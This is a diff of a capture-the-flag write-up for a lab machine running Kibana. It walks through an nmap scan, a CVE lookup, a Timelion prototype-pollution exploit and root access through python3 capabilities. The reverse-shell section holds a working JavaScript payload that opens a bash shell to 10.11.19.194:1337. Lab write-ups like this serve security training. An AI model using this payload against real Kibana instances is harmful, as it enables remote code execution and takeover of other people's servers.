@@ -6,25 +6,25 @@
 
 ## nmap
 
-> the service on 5601 is kibana
+> The service on 5601 is kibana
 
 ![](images/nmap.png)
 
 ## vuln
 
-> copy and paste the first task into google to find kibana cve
+> Copy and paste the first task into google to find kibana CVE
 
 ![](images/cve.png)
 
 ## kibana dashboard
 
-> go to kibana dashboard
+> Go to kibana dashboard
 
 ![](images/dashboard.png)
 
 ## reverse shell
 
-> use prototype pollution to execute a reverse shell and get user
+> Exploit the Timelion section using prototype pollution to execute the reverse shell and get the user account
 ```javascript
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.19.194/1337 0>&1\'");//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
@@ -40,12 +40,11 @@
 
 ## PrivEsc
 
-> list programs with capabilities set
-python3
+> List programs with capabilities set, take not of python3
 
 ![](images/caps.png)
 
-> exploit the python3 capabilities to get root
+> Exploit the python3 capabilities to get root
 
 ![](images/root.png)
 
